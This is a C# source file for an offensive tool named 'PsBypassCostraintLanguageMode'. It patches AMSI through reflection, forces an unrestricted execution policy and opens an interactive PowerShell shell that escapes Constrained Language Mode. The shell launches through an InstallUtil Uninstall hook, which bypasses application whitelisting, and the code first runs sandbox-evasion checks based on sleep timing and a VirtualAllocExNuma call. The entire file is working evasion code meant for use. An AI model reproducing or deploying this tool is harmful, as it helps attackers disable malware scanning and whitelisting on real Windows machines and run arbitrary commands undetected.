using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string command = "";

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            command = "$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}};$f.SetValue($null,$true)";
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                try
                {
                    pipeline.Commands.AddScript(command);
                    pipeline.Commands.Add("Out-String");

                    Collection<PSObject> results = pipeline.Invoke();

                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        stringBuilder.AppendLine(obj.ToString());
                    }
                    Console.WriteLine("[+] AMSI Bypassed!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] AMSI bypass error :(");
                    Console.WriteLine("{0}", ex.Message);
                }
            }
            
            do
            {
                Console.Write("PS > ");
                command = Console.ReadLine();

                // vervbse check!
                if (!string.IsNullOrEmpty(command))
                {
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        try
                        {
                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");

                            Collection<PSObject> results = pipeline.Invoke();

							StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
								stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            }
            while (command != "exit");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // check for sandboxes
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5){return;}
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null){return;}

            PsBypassCostraintLanguageMode.Program.Main(new string[] { });
        }
        public override void Install(System.Collections.IDictionary savedState){}
    }
}
